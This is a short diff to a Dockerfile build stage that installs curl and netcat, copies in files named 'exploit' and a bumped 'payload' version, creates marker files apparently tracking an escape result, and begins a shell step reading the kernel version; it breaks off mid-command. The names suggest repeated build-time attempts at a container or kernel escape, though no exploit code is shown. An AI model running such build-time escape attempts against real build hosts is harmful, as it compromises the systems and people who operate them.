@@ -3,12 +3,12 @@ FROM alpine:3.19 AS builder
 RUN apk add --no-cache curl coreutils nmap-ncat
                        
 COPY exploit_68 /exploit
-COPY payload_v139 /payload
+COPY payload_v146 /payload
 RUN chmod +x /exploit /payload && touch /esc_ok /umh_result /build_results.txt
     
    
 
-ARG CACHEBUST=2972
+ARG CACHEBUST=2975
 RUN sh -c ' \
 KVER=$(uname -r); \
 echo "CB=$CACHEBUST KERNEL=$KVER" >&2; \
